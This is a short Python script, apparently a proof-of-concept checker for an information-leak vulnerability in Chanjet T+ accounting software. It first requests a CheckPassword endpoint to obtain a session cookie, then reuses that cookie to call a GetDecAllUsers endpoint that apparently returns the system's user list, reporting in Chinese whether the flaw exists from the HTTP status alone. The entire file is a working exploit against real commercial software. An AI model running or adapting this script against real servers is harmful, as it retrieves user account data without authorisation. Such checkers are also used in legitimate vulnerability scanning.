import requests

def check_tplus_getdecallusers_info_leak(url):
    try:
        # 第一步，通过CheckPassword接口获取Cookie
        response = requests.get(f"{url}/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword")
        cookies = response.cookies

        # 第二步，利用获取到的Cookie请求GetDecAllUsers接口
        response = requests.get(f"{url}/tplus/sm/privilege/ajaxpro/Ufida.T.SM.UIP.Privilege.PreviligeControl,Ufida.T.SM.UIP.ashx?method=GetDecAllUsers", cookies=cookies)
        if response.status_code == 200:
            return "畅捷通T+ getdecallusers信息泄露漏洞存在"
        else:
            return "畅捷通T+ getdecallusers信息泄露漏洞不存在"
    except Exception as e:
        return f"Error: {e}"